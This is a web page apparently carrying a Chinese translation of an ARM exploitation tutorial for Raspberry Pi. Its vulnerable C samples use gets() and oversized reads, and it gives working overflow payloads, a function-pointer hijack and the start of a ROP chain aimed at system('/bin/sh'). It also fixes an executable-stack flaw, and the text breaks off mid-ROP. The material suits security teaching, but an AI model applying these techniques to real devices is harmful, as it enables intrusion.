<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  <title>arm exploitation for iot---episode 3 | 物联网安全技术研究</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  
  
  
  
  <meta name="description" content="原文地址：https://quequero.org/2017/11/arm-exploitation-iot-episode-3/作者：andrea sindoni翻译：大部分来源于谷歌的网页翻译，对谷歌翻译表示感谢。祝大家双11能解出难度大于漏洞利用的题—优惠券的最佳搭配方案">
<meta property="og:type" content="article">
<meta property="og:title" content="ARM exploitation for IoT---Episode 3">
<meta property="og:url" content="http://yoursite.com/2017/11/10/ARM-exploitation-for-IoT-Episode-3/index.html">
<meta property="og:site_name" content="物联网安全技术研究">
<meta property="og:description" content="原文地址：https://quequero.org/2017/11/arm-exploitation-iot-episode-3/作者：andrea sindoni翻译：大部分来源于谷歌的网页翻译，对谷歌翻译表示感谢。祝大家双11能解出难度大于漏洞利用的题—优惠券的最佳搭配方案">
<meta property="og:locale" content="zh-CN">
<meta property="og:image" content="http://yoursite.com/2017/11/10/ARM-exploitation-for-IoT-Episode-3/0">
<meta property="og:image" content="http://yoursite.com/2017/11/10/ARM-exploitation-for-IoT-Episode-3/1">
<meta property="og:image" content="http://yoursite.com/2017/11/10/ARM-exploitation-for-IoT-Episode-3/2">
<meta property="og:image" content="http://yoursite.com/2017/11/10/ARM-exploitation-for-IoT-Episode-3/3">
<meta property="og:image" content="http://yoursite.com/2017/11/10/ARM-exploitation-for-IoT-Episode-3/4">
<meta property="og:image" content="http://yoursite.com/2017/11/10/ARM-exploitation-for-IoT-Episode-3/5">
<meta property="og:image" content="http://yoursite.com/2017/11/10/ARM-exploitation-for-IoT-Episode-3/6">
<meta property="og:image" content="http://yoursite.com/2017/11/10/ARM-exploitation-for-IoT-Episode-3/7">
<meta property="og:image" content="http://yoursite.com/2017/11/10/ARM-exploitation-for-IoT-Episode-3/8">
<meta property="og:image" content="http://yoursite.com/2017/11/10/ARM-exploitation-for-IoT-Episode-3/9">
<meta property="og:image" content="http://yoursite.com/2017/11/10/ARM-exploitation-for-IoT-Episode-3/10">
<meta property="og:image" content="http://yoursite.com/2017/11/10/ARM-exploitation-for-IoT-Episode-3/11">
<meta property="og:image" content="http://yoursite.com/2017/11/10/ARM-exploitation-for-IoT-Episode-3/12">
<meta property="og:image" content="http://yoursite.com/2017/11/10/ARM-exploitation-for-IoT-Episode-3/13">
<meta property="og:image" content="http://yoursite.com/2017/11/10/ARM-exploitation-for-IoT-Episode-3/14">
<meta property="og:image" content="http://yoursite.com/2017/11/10/ARM-exploitation-for-IoT-Episode-3/15">
<meta property="og:image" content="http://yoursite.com/2017/11/10/ARM-exploitation-for-IoT-Episode-3/16">
<meta property="og:image" content="http://yoursite.com/2017/11/10/ARM-exploitation-for-IoT-Episode-3/17">
<meta property="og:image" content="http://yoursite.com/2017/11/10/ARM-exploitation-for-IoT-Episode-3/18">
<meta property="og:image" content="http://yoursite.com/2017/11/10/ARM-exploitation-for-IoT-Episode-3/19">
<meta property="og:image" content="http://yoursite.com/2017/11/10/ARM-exploitation-for-IoT-Episode-3/20">
<meta property="og:image" content="http://yoursite.com/2017/11/10/ARM-exploitation-for-IoT-Episode-3/21">
<meta property="og:image" content="http://yoursite.com/2017/11/10/ARM-exploitation-for-IoT-Episode-3/22">
<meta property="og:image" content="http://yoursite.com/2017/11/10/ARM-exploitation-for-IoT-Episode-3/23">
<meta property="og:image" content="http://yoursite.com/2017/11/10/ARM-exploitation-for-IoT-Episode-3/24">
<meta property="og:image" content="http://yoursite.com/2017/11/10/ARM-exploitation-for-IoT-Episode-3/25">
<meta property="og:image" content="http://yoursite.com/2017/11/10/ARM-exploitation-for-IoT-Episode-3/26">
<meta property="og:image" content="http://yoursite.com/2017/11/10/ARM-exploitation-for-IoT-Episode-3/27">
<meta property="og:image" content="http://yoursite.com/2017/11/10/ARM-exploitation-for-IoT-Episode-3/28">
<meta property="og:image" content="http://yoursite.com/2017/11/10/ARM-exploitation-for-IoT-Episode-3/29">
<meta property="og:image" content="http://yoursite.com/2017/11/10/ARM-exploitation-for-IoT-Episode-3/30">
<meta property="og:image" content="http://yoursite.com/2017/11/10/ARM-exploitation-for-IoT-Episode-3/31">
<meta property="og:image" content="http://yoursite.com/2017/11/10/ARM-exploitation-for-IoT-Episode-3/32">
<meta property="og:image" content="http://yoursite.com/2017/11/10/ARM-exploitation-for-IoT-Episode-3/33">
<meta property="og:image" content="http://yoursite.com/2017/11/10/ARM-exploitation-for-IoT-Episode-3/34">
<meta property="og:updated_time" content="2017-11-10T15:11:32.101Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="ARM exploitation for IoT---Episode 3">
<meta name="twitter:description" content="原文地址：https://quequero.org/2017/11/arm-exploitation-iot-episode-3/作者：andrea sindoni翻译：大部分来源于谷歌的网页翻译，对谷歌翻译表示感谢。祝大家双11能解出难度大于漏洞利用的题—优惠券的最佳搭配方案">
<meta name="twitter:image" content="http://yoursite.com/2017/11/10/ARM-exploitation-for-IoT-Episode-3/0">
  
    <link rel="alternate" href="/atom.xml" title="物联网安全技术研究" type="application/atom+xml">
  
  <link rel="icon" href="/css/images/favicon.ico">
  
    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
  
  <link href="https://fonts.googleapis.com/css?family=Open+Sans|Montserrat:700" rel="stylesheet" type="text/css">
  <link href="https://fonts.googleapis.com/css?family=Roboto:400,300,300italic,400italic" rel="stylesheet" type="text/css">
  <link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
  <style type="text/css">
    @font-face{font-family:futura-pt;src:url(https://use.typekit.net/af/9749f0/00000000000000000001008f/27/l?subset_id=2&fvd=n5) format("woff2");font-weight:500;font-style:normal;}
    @font-face{font-family:futura-pt;src:url(https://use.typekit.net/af/90cf9f/000000000000000000010091/27/l?subset_id=2&fvd=n7) format("woff2");font-weight:500;font-style:normal;}
    @font-face{font-family:futura-pt;src:url(https://use.typekit.net/af/8a5494/000000000000000000013365/27/l?subset_id=2&fvd=n4) format("woff2");font-weight:lighter;font-style:normal;}
    @font-face{font-family:futura-pt;src:url(https://use.typekit.net/af/d337d8/000000000000000000010095/27/l?subset_id=2&fvd=i4) format("woff2");font-weight:400;font-style:italic;}</style>
    
  <link rel="stylesheet" id="athemes-headings-fonts-css" href="//fonts.googleapis.com/css?family=Yanone+Kaffeesatz%3A200%2C300%2C400%2C700&amp;ver=4.6.1" type="text/css" media="all">
  <link rel="stylesheet" href="/css/style.css">

  <script src="/js/jquery-3.1.1.min.js"></script>

  <!-- Bootstrap core CSS -->
  <link rel="stylesheet" href="/css/bootstrap.css" >
  <link rel="stylesheet" href="/css/hiero.css" >
  <link rel="stylesheet" href="/css/glyphs.css" >
  

</head>

<script>
var themeMenus = {};

  themeMenus["/"] = "主页"; 

  themeMenus["/books"] = "书籍"; 

  themeMenus["/tools"] = "工具"; 

  themeMenus["/about"] = "关于"; 

</script>


  <body data-spy="scroll" data-target="#toc" data-offset="50">


  <header id="allheader" class="site-header" role="banner">
  <div class="clearfix container">
      <div class="site-branding">

          <h1 class="site-title">
            
              <a href="/" title="物联网安全技术研究" rel="home"> 物联网安全技术研究 </a>
            
          </h1>

          
            <div class="site-description">一个专注于物联网安全技术研究与交流的小站</div>
          
            
          <nav id="main-navigation" class="main-navigation" role="navigation">
            <a class="nav-open">Menu</a>
            <a class="nav-close">Close</a>
            <div class="clearfix sf-menu">

              <ul id="main-nav" class="nmenu sf-js-enabled">
                    
                      <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-1663"> <a class="" href="/">主页</a> </li>
                    
                      <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-1663"> <a class="" href="/books">书籍</a> </li>
                    
                      <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-1663"> <a class="" href="/tools">工具</a> </li>
                    
                      <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-1663"> <a class="" href="/about">关于</a> </li>
                    
              </ul>
            </div>
          </nav>


      </div>
  </div>
</header>


  <div id="container">
    <div id="wrap">
            
      <div id="content" class="outer">
        
          <section id="main" style="float:none;"><article id="post-ARM-exploitation-for-IoT-Episode-3"  class="article article-type-post" itemscope itemprop="blogPost" >
  <div id="articleInner" class="clearfix post-1016 post type-post status-publish format-standard has-post-thumbnail hentry category-template-2 category-uncategorized tag-codex tag-edge-case tag-featured-image tag-image tag-template">
    
    
      <header class="article-header">
        
  
    <h1 class="thumb" class="article-title" itemprop="name">
      ARM exploitation for IoT---Episode 3
    </h1>
  

      </header>
    
    <div class="article-meta">
      
	Posted on <a href="/2017/11/10/ARM-exploitation-for-IoT-Episode-3/" class="article-date">
	  <time datetime="2017-11-10T10:28:22.000Z" itemprop="datePublished">十一月 10, 2017</time>
	</a>

      
	<span id="busuanzi_container_page_pv">
	  本文总阅读量<span id="busuanzi_value_page_pv"></span>次
	</span>

    </div>
    <div class="article-entry" itemprop="articleBody">
      
        <p>原文地址：<a href="https://quequero.org/2017/11/arm-exploitation-iot-episode-3/" target="_blank" rel="external">https://quequero.org/2017/11/arm-exploitation-iot-episode-3/</a><br>作者：andrea sindoni<br>翻译：大部分来源于谷歌的网页翻译，对谷歌翻译表示感谢。<br>祝大家双11能解出难度大于漏洞利用的题—优惠券的最佳搭配方案</p>
<a id="more"></a>
<p>在之前<a href="https://quequero.org/2017/07/arm-exploitation-iot-episode-1/" target="_blank" rel="external">第一篇</a><a href="https://quequero.org/2017/09/arm-exploitation-iot-episode-2/" target="_blank" rel="external">第二篇</a>中，我们已经看到了一些关于ARM逆向和shellcode编写的基本概念。在这最后一部分将尽可能简单地介绍一些利用方式。</p>
<p>主题列表是:</p>
<ol>
<li>修改局部变量的值</li>
<li>重定向执行流程</li>
<li>覆盖返回地址</li>
<li>GOT覆盖</li>
<li>C ++虚拟表</li>
</ol>
<p>我们将使用GEF (<a href="https://github.com/hugsy/gef" target="_blank" rel="external">https://github.com/hugsy/gef</a>)由<a href="https://twitter.com/_hugsy_" target="_blank" rel="external">@</a><a href="https://twitter.com/_hugsy_" target="_blank" rel="external"><em>hugsy</em></a>为逆向工程和漏洞利用而开发的多架构GDB的增强功能。</p>
<p>GEF是针对x86，ARM，MIPS，PowerPC和SPARC的一系列命令，让GDB再次为开发者提供酷炫的命令</p>
<h1 id="修改局部变量的值"><a href="#修改局部变量的值" class="headerlink" title="修改局部变量的值"></a>修改局部变量的值</h1><p>我们以修改一个局部变量为最初的例子，源码:<a href="https://github.com/invictus1306/ARM-episodes/blob/master/Episode3/stack1.c" target="_blank" rel="external">stack1.c</a></p>
<pre><code>#include &lt;stdio.h&gt;

char pwdSecret[] = &quot;stack123!&quot;;

void print_secr(){

    printf(&quot;Password is %s\n&quot;, pwdSecret);

}

int main(int argc, char **argv){

    int check=0;

    char buffer[32];

    gets(buffer);


    if(check == 0x74696445) {

        print_secr();

    }else{

        printf(&quot;No password to show\n&quot;);

    }

}
</code></pre><p>使用-g选项编译程序以便于分析。</p>
<pre><code>root@raspberrypi:/home/pi/arm/episode3# gcc -o stack1 stack1.c -g

stack1.c: In function ‘main’:

stack1.c:15:3: warning: ‘gets’ is deprecated (declared at /usr/include/stdio.h:638) [-Wdeprecated-declarations]

gets(buffer);

^

/tmp/ccA0dlly.o: In function `main&apos;:

stack1.c:(.text+0x44): warning: the `gets&apos; function is dangerous and should not be used.
</code></pre><p>编译器建议不要使用gets()，不要忽略编译器的警告;例如，可以使用fgets()函数，但是我们的目标是证明上面的代码实际上是危险的。</p>
<p>让我们从这里开始:</p>
<pre><code>echo `python -c &apos;print &quot;A&quot;*41&apos;` | ./stack1
</code></pre><p>正如我们所期望的那样，存在段错误<br><img src="/2017/11/10/ARM-exploitation-for-IoT-Episode-3/0" alt=""></p>
<p>让我们来分析崩溃，打开gdb并在指令处设置一个断点</p>
<pre><code>gets(buffer);
</code></pre><p>然后插入下面的有效载荷</p>
<pre><code>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
</code></pre><p>继续nexti并查看缓冲区的内容</p>
<pre><code>gef&gt; x/12x buffer

0x7efff664:0x41414141 0x41414141 0x41414141 0x41414141

0x7efff674:0x41414141 0x41414141 0x41414141 0x00004141

0x7efff684:0x00000000 0x00000000 0x76e8f678 0x76fb4000
</code></pre><p>我们可以看到从0xbefff664到0xbefff664 + 30的0x41字节的顺序，我们也可以注意到地址0xbefff684是“check”局部变量的地址</p>
<pre><code>gef&gt; p &amp;check

$2 = (int *) 0x7efff684
</code></pre><p>那么如果我们发送更长的有效载荷，我们可以覆盖“检查”变量。</p>
<p>例如，如果我们用这个0x45646974覆盖检查变量，则应该打印密码。</p>
<p>重新启动程序并发送以下有效载荷:</p>
<pre><code>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEdit
</code></pre><p>我们在gets指令之后转储缓冲区数组:</p>
<pre><code>gef&gt; x/12x buffer
0x7efff664:    0x41414141    0x41414141    0x41414141    0x41414141
0x7efff674:    0x41414141    0x41414141    0x41414141    0x41414141
0x7efff684:    0x74696445    0x00000000    0x76e8f678    0x76fb4000
</code></pre><p>如预期的那样，“检查”变量现在被覆盖</p>
<pre><code>gef&gt; p check

$3 = 0x74696445
</code></pre><p>继续执行</p>
<pre><code>Continuing.

Password is stack123!

[Inferior 1 (process 7243) exited normally]
</code></pre><p>我们可以用python自动化一切:</p>
<pre><code>root@raspberrypi:/home/pi/arm/episode3# echo `python -c &apos;print &quot;A&quot;*32+&quot;Edit&quot;&apos;` | ./stack1

Password is stack123!
</code></pre><h1 id="重定向执行流程"><a href="#重定向执行流程" class="headerlink" title="重定向执行流程"></a>重定向执行流程</h1><p>我们将看到如何重定向执行流程。首先分析下面的代码:</p>
<p>文件:<a href="https://github.com/invictus1306/ARM-episodes/blob/master/Episode3/redirect_execution.c" target="_blank" rel="external">redirect_execution.c</a></p>
<pre><code>#include &lt;stdio.h&gt;
#include &lt;string.h&gt;


char msgSecret[] = &quot;This is the secret message&quot;;

char msgDefault[] = &quot;This is the default message&quot;;


typedef struct _msg_struct{

    char message[32];

    int (*print_msg)();

}msg_struct;


int print_secr(){

    printf(&quot;Congrats! %s\n&quot;, msgSecret);

    return 0;

}


int print_default(){

    printf(&quot;Hello! %s\n&quot;, msgDefault);

    return 0;

}


int main(int argc, char **argv){

    char message[80];

    msg_struct p;

    printf(&quot;Please enter a message: \n&quot;);

    gets(message);

    if(*message){

        p.print_msg=print_default;

        strcpy(p.message, message);

        p.print_msg();

    }else{

        printf(&quot;Insert the message!\n&quot;);

    }

    return 0;

}
</code></pre><p>运行该程序并输入以下字符串:</p>
<pre><code>“AAAAAA”
</code></pre><p>看看p.print_msg的地址:</p>
<pre><code>gef&gt; x/x &amp;p.print_msg
0x7efff614:    0x000104f8
</code></pre><p>查看变量p.username的一些字节:</p>
<pre><code>gef&gt; x/9x p.message
0x7efff5f4:    0x41414141    0x00004141    0x76ffd14c    0x76fffc50
0x7efff604:    0x7efff654    0x7efff650    0x00000000    0x76ffecf0
0x7efff614:    0x000104f8
</code></pre><p>我们可以推断，如果我们插入更多的字节（用户输入），我们可以覆盖函数指针的地址0x7efff614的值</p>
<p>我们试着插入下面的有效载荷:</p>
<pre><code>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB
</code></pre><p>我们在以下位置设置断点:</p>
<pre><code>38        p.print_pwd();
</code></pre><p>看看p.print_msg的地址:</p>
<pre><code>gef&gt; x/x &amp;p.print_msg
0x7efff614:    0x42424242

gef&gt; x/9x p.message
0x7efff5f4:    0x41414141    0x41414141    0x41414141    0x41414141
0x7efff604:    0x41414141    0x41414141    0x41414141    0x41414141
0x7efff614:    0x42424242
</code></pre><p>函数指针的值被替换为0x42424242，现在我们试着用print_secr（）函数的地址来改变这个值。</p>
<pre><code>gef&gt; p print_secr
$1 = {int ()} 0x104d0 &lt;print_secr&gt;

gef&gt; set *(int*)0x7efff614=0x104d0
gef&gt; x/9x p.message
0x7efff5f4:    0x41414141    0x41414141    0x41414141    0x41414141
0x7efff604:    0x41414141    0x41414141    0x41414141    0x41414141
0x7efff614:    0x000104d0
</code></pre><p>然后继续执行:</p>
<pre><code>gef&gt; c
Continuing.
Congrats! This is the secret message
[Inferior 1 (process 10712) exited normally]
</code></pre><p>再次…我们可以使用python自动化一切:</p>
<pre><code>root@raspberrypi:/home/pi/arm/episode3# python -c &quot;print &apos;A&apos;*32 + &apos;\xd0\x04\x01\x00&apos;&quot; | ./redirect_execution

Please enter a message:

Congrats! This is the secret message
</code></pre><p><em>重要的提示</em></p>
<p>如果我们看一下栈权限（例如vmmap），我们可以看到这个范围是可执行的:</p>
<pre><code>0x7efdf000 0x7f000000 0x00000000 rwx [stack]
</code></pre><p>在后面的章节中，我们将使用一个不可执行的堆栈部分.</p>
<p>如果我们用编译器选项“ -z noexecstack ” 编译程序 (<a href="https://github.com/invictus1306/ARM-episodes/blob/master/Episode3/redirect_execution.c" target="_blank" rel="external">redirect_execution.c</a>)</p>
<pre><code>root@raspberrypi:/home/pi/arm/episode3# gcc -o redirect_execution redirect_execution.c -z noexecstack
</code></pre><p>并看看堆栈权限:</p>
<pre><code>gef&gt; vmmap
Start      End        Offset     Perm Path

0x00010000 0x00011000 0x00000000 r-x /home/pi/arm/episode3/redirect_execution

0x00020000 0x00021000 0x00000000 r-- /home/pi/arm/episode3/redirect_execution

0x00021000 0x00022000 0x00001000 rw- /home/pi/arm/episode3/redirect_execution

0x00022000 0x00043000 0x00000000 rw- [heap]

0x76e7a000 0x76fa4000 0x00000000 r-x /lib/arm-linux-gnueabihf/libc-2.24.so

0x76fa4000 0x76fb3000 0x0012a000 --- /lib/arm-linux-gnueabihf/libc-2.24.so

0x76fb3000 0x76fb5000 0x00129000 r-- /lib/arm-linux-gnueabihf/libc-2.24.so

0x76fb5000 0x76fb6000 0x0012b000 rw- /lib/arm-linux-gnueabihf/libc-2.24.so

0x76fb6000 0x76fb9000 0x00000000 rw-

0x76fb9000 0x76fbe000 0x00000000 r-x /usr/lib/arm-linux-gnueabihf/libarmmem.so

0x76fbe000 0x76fcd000 0x00005000 --- /usr/lib/arm-linux-gnueabihf/libarmmem.so

0x76fcd000 0x76fce000 0x00004000 rw- /usr/lib/arm-linux-gnueabihf/libarmmem.so

0x76fce000 0x76fef000 0x00000000 r-x /lib/arm-linux-gnueabihf/ld-2.24.so

0x76fef000 0x76ff1000 0x00000000 rw-

0x76ff8000 0x76ffb000 0x00000000 rw-

0x76ffb000 0x76ffc000 0x00000000 r-x [sigpage]

0x76ffc000 0x76ffd000 0x00000000 r-- [vvar]

0x76ffd000 0x76ffe000 0x00000000 r-x [vdso]

0x76ffe000 0x76fff000 0x00020000 r-- /lib/arm-linux-gnueabihf/ld-2.24.so

0x76fff000 0x77000000 0x00021000 rw- /lib/arm-linux-gnueabihf/ld-2.24.so

0x7efdf000 0x7f000000 0x00000000 rwx [stack]

0xffff0000 0xffff1000 0x00000000 r-x [vectors]
</code></pre><p>该堆栈仍然可执行.</p>
<p>经过快速分析，我们可以明白，一切的原因是共享库libarmmem.so，它使用“/etc/ld.so.preload”文件加载到内存中</p>
<pre><code>root@raspberrypi:/home/pi/arm/episode3# cat /etc/ld.so.preload

/usr/lib/arm-linux-gnueabihf/libarmmem.so
</code></pre><p>我们可以验证GNU_STACK程序头标记为RWE:</p>
<pre><code>root@raspberrypi:/home/pi/arm/episode3# readelf -l /usr/lib/arm-linux-gnueabihf/libarmmem.so

Elf file type is DYN (Shared object file)

Entry point 0x568

There are 6 program headers, starting at offset 52


Program Headers:
    Type           Offset   VirtAddr   PhysAddr   FileSiz MemSiz  Flg Align
    LOAD           0x000000 0x00000000 0x00000000 0x043f0 0x043f0 R E 0x10000
    LOAD           0x0043f0 0x000143f0 0x000143f0 0x00130 0x00134 RW  0x10000
    DYNAMIC        0x0043fc 0x000143fc 0x000143fc 0x000e8 0x000e8 RW  0x4
    NOTE           0x0000f4 0x000000f4 0x000000f4 0x00024 0x00024 R   0x4
    GNU_EH_FRAME   0x0042cc 0x000042cc 0x000042cc 0x0002c 0x0002c R   0x4
    GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RWE 0x10

Section to Segment mapping:
  Segment Sections...
    00     .note.gnu.build-id .gnu.hash .dynsym .dynstr .gnu.version .gnu.version_r .rel.dyn .rel.plt .init .plt .text .fini .eh_frame_hdr .eh_frame
    01     .init_array .fini_array .jcr .dynamic .got .data .bss
    02     .dynamic
    03     .note.gnu.build-id
    04     .eh_frame_hdr
    05     
</code></pre><p>这意味着那些使用我的相同raspbian版本（我还没有验证其他版本）的人遭受同样的问题：部分堆栈是可执行的.</p>
<p>造成这个问题的原因之一是汇编文件 (<a href="https://github.com/RPi-Distro/arm-mem/blob/master/architecture.S" target="_blank" rel="external">https://github.com/RPi-Distro/arm-mem/blob/master/architecture.S</a>) 缺少了GNU堆栈选项</p>
<p>怎么修复呢?</p>
<p>我们可以添加这个:</p>
<pre><code>/* Prevent the stack from becoming executable */
#if defined(__linux__) &amp;&amp; defined(__ELF__)
.section .note.GNU-stack,&quot;&quot;,%progbits
#endif
</code></pre><p>到architecture.S文件.</p>
<p>我就修复后的文件放到这里<a href="https://github.com/invictus1306/arm-mem" target="_blank" rel="external">https://github.com/invictus1306/arm-mem</a>,你可以下载编译:</p>
<pre><code>root@raspberrypi:/home/pi/arm/episode3/arm-mem-master# make

gcc -c -o architecture.o architecture.S

gcc -c -o memcmp.o memcmp.S

gcc -c -o memcpymove.o memcpymove.S

gcc -c -o memcpymove-a7.o memcpymove-a7.S

gcc -c -o memset.o memset.S

gcc -std=gnu99 -O2 -c -o trampoline.o trampoline.c

gcc -shared -o libarmmem.so architecture.o memcmp.o memcpymove.o memcpymove-a7.o memset.o trampoline.o

ar rcs libarmmem.a architecture.o memcmp.o memcpymove.o memcpymove-a7.o memset.o trampoline.o

gcc -std=gnu99 -O2 -c -o test.o test.c

gcc -o test test.o
</code></pre><p>验证GNU_STACK程序头:</p>
<pre><code>root@raspberrypi:/home/pi/arm/episode3/arm-mem-master# readelf -l libarmmem.so

Elf file type is DYN (Shared object file)

Entry point 0x588

There are 7 program headers, starting at offset 52

Program Headers:

    Type           Offset   VirtAddr   PhysAddr   FileSiz MemSiz  Flg Align
    LOAD           0x000000 0x00000000 0x00000000 0x04410 0x04410 R E 0x10000
    LOAD           0x004f0c 0x00014f0c 0x00014f0c 0x00130 0x00134 RW  0x10000
    DYNAMIC        0x004f18 0x00014f18 0x00014f18 0x000e8 0x000e8 RW  0x4
    NOTE           0x000114 0x00000114 0x00000114 0x00024 0x00024 R   0x4
    GNU_EH_FRAME   0x0042ec 0x000042ec 0x000042ec 0x0002c 0x0002c R   0x4
    GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RW  0x10
    GNU_RELRO      0x004f0c 0x00014f0c 0x00014f0c 0x000f4 0x000f4 R   0x1

Section to Segment mapping:

Segment Sections...
    00     .note.gnu.build-id .gnu.hash .dynsym .dynstr .gnu.version .gnu.version_r .rel.dyn .rel.plt .init .plt .text .fini .eh_frame_hdr .eh_frame
    01     .init_array .fini_array .jcr .dynamic .got .data .bss
    02     .dynamic
    03     .note.gnu.build-id
    04     .eh_frame_hdr
    05     
    06     .init_array .fini_array .jcr .dynamic
</code></pre><p>编辑文件“/etc/ld.so.preload”，添加新共享库的路径</p>
<pre><code>root@raspberrypi:/home/pi/arm/episode3/arm-mem-master# cat /etc/ld.so.preload

/home/pi/arm/episode3/arm-mem-master/libarmmem.so
</code></pre><p>回到我们的例子，并尝试再次编译它:</p>
<pre><code>root@raspberrypi:/home/pi/arm/episode3# gcc -o redirect_execution redirect_execution.c -z noexecstack
</code></pre><p>现在我们可以验证堆栈不可执行了:</p>
<pre><code>gef&gt; vmmap
Start      End        Offset     Perm Path

0x00010000 0x00011000 0x00000000 r-x /home/pi/arm/episode3/redirect_execution

0x00020000 0x00021000 0x00000000 r-- /home/pi/arm/episode3/redirect_execution

0x00021000 0x00022000 0x00001000 rw- /home/pi/arm/episode3/redirect_execution

0x76e79000 0x76fa3000 0x00000000 r-x /lib/arm-linux-gnueabihf/libc-2.24.so

0x76fa3000 0x76fb2000 0x0012a000 --- /lib/arm-linux-gnueabihf/libc-2.24.so

0x76fb2000 0x76fb4000 0x00129000 r-- /lib/arm-linux-gnueabihf/libc-2.24.so

0x76fb4000 0x76fb5000 0x0012b000 rw- /lib/arm-linux-gnueabihf/libc-2.24.so

0x76fb5000 0x76fb8000 0x00000000 rw-

0x76fb8000 0x76fbd000 0x00000000 r-x /home/pi/arm/episode3/arm-mem-master/libarmmem.so

0x76fbd000 0x76fcc000 0x00005000 --- /home/pi/arm/episode3/arm-mem-master/libarmmem.so

0x76fcc000 0x76fcd000 0x00004000 r-- /home/pi/arm/episode3/arm-mem-master/libarmmem.so

0x76fcd000 0x76fce000 0x00005000 rw- /home/pi/arm/episode3/arm-mem-master/libarmmem.so

0x76fce000 0x76fef000 0x00000000 r-x /lib/arm-linux-gnueabihf/ld-2.24.so

0x76fef000 0x76ff1000 0x00000000 rw-

0x76ff8000 0x76ffb000 0x00000000 rw-

0x76ffb000 0x76ffc000 0x00000000 r-x [sigpage]

0x76ffc000 0x76ffd000 0x00000000 r-- [vvar]

0x76ffd000 0x76ffe000 0x00000000 r-x [vdso]

0x76ffe000 0x76fff000 0x00020000 r-- /lib/arm-linux-gnueabihf/ld-2.24.so

0x76fff000 0x77000000 0x00021000 rw- /lib/arm-linux-gnueabihf/ld-2.24.so

0x7efdf000 0x7f000000 0x00000000 rw- [stack]

0xffff0000 0xffff1000 0x00000000 r-x [vectors]
</code></pre><p>已经修复好了，现在我们可以继续下一章.</p>
<h1 id="覆盖返回地址"><a href="#覆盖返回地址" class="headerlink" title="覆盖返回地址"></a>覆盖返回地址</h1><p>在本章中，我们将看到如何使用简单的ROP小工具来弹出一个shell。</p>
<p>我们要分析的文件将不能执行堆栈，  启用ASLR，没有PIE，所以我们只能找到在libc中导入的函数的地址。</p>
<p>这是文件 (<a href="https://github.com/invictus1306/ARM-episodes/blob/master/Episode3/stack_overflow.c" target="_blank" rel="external">stack_overflow.c</a>):</p>
<pre><code>#include &lt;stdio.h&gt;


void rop_func(){

    asm volatile(

        &quot;pop {r0, r1, r2, lr} \n\t&quot;

        &quot;bx lr \n\t&quot;

    );

}


void msg_func(){

    char message[64];

    read(0, message, 256);

}


int main(){

    msg_func();

    write(1, &quot;Good done!\n&quot;,12);

    return 0;

}
</code></pre><p>编译程序</p>
<pre><code>root@raspberrypi:/home/pi/arm/episode3# gcc -o stack_overflow stack_overflow.c -g
</code></pre><p>在gef中运行checksec命令</p>
<pre><code>gef&gt; checksec

[+] checksec for &apos;/home/pi/arm/episode3/stack_overflow&apos;
Canary                        : No
NX                            : Yes
PIE                           : No
Fortify                       : No
RelRO                         : Partial
</code></pre><p>启用ASLR</p>
<pre><code>root@raspberrypi:/home/pi/arm/episode3# echo 2 | sudo tee /proc/sys/kernel/randomize_va_space

2
</code></pre><p>我们可以注意到有一个函数包含一个小的指令序列（rop_func）。</p>
<p>接下来使用的方式不是利用该程序的唯一方式。</p>
<p>我们将采用的方式是使用“write”函数打印“read”函数（泄漏）的地址，从而可以计算“system”函数的地址并使用“/bin/sh“。</p>
<p>总结一下:</p>
<ol>
<li>获取系统功能的地址</li>
<li>执行system(“/bin/sh”)</li>
</ol>
<h2 id="获取系统功能的地址"><a href="#获取系统功能的地址" class="headerlink" title="获取系统功能的地址"></a>获取系统功能的地址</h2><p>启动程序并第12行设置断点</p>
<pre><code>-&gt;  12       read(0, message, 256);
</code></pre><p>发送的有效载荷是</p>
<pre><code>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
</code></pre><p>继续下一条指令</p>
<pre><code>gef&gt; next

AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
</code></pre><p>查看栈</p>
<pre><code>gef&gt; x/18x $sp
0x7efff630:    0x41414141    0x41414141    0x41414141    0x41414141
0x7efff640:    0x41414141    0x41414141    0x41414141    0x41414141
0x7efff650:    0x41414141    0x41414141    0x41414141    0x41414141
0x7efff660:    0x41414141    0x41414141    0x41414141    0x41414141
0x7efff670:    0x7efff60a    0x000104bc
</code></pre><p>现在到了这条指令:</p>
<pre><code>-&gt;   0x104a8 &lt;msg_func+32&gt;    sub    sp,  r11,  #4
</code></pre><p>继续:</p>
<pre><code>-&gt;   0x104ac &lt;msg_func+36&gt;    pop    {r11,  pc}
</code></pre><p>看看栈:</p>
<pre><code>gef&gt; x/2x $sp
0x7efff670:    0x7efff60a    0x000104bc
</code></pre><p>然后，如果我们将发送更多的字节（作为有效载荷），我们将能够覆盖地址0x7efff670和0x7efff674。</p>
<p>通过手动设置寄存器, 可以跳到“rop_func” function</p>
<pre><code>gef&gt; p rop_func
$1 = {void ()} 0x1046c &lt;rop_func&gt;
gef&gt;  set *(int*)($sp+4)=0x1046c
gef&gt;  set *(int*)$sp=0x00000001
gef&gt; x/2x $sp
0x7efff670:    0x00000001    0x0001046c
</code></pre><p>如果我们继续使用stepi指令，则可以使用rop_func:</p>
<pre><code>-&gt;   0x1046c &lt;rop_func+0&gt;     push   {r11}        ; (str r11,  [sp,  #-4]!)
      0x10470 &lt;rop_func+4&gt;     add    r11,  sp,  #0
      0x10474 &lt;rop_func+8&gt;     pop    {r0,  r1,  r2,  lr}
      0x10478 &lt;rop_func+12&gt;    bx     lr
      0x1047c &lt;rop_func+16&gt;    sub    sp,  r11,  #0
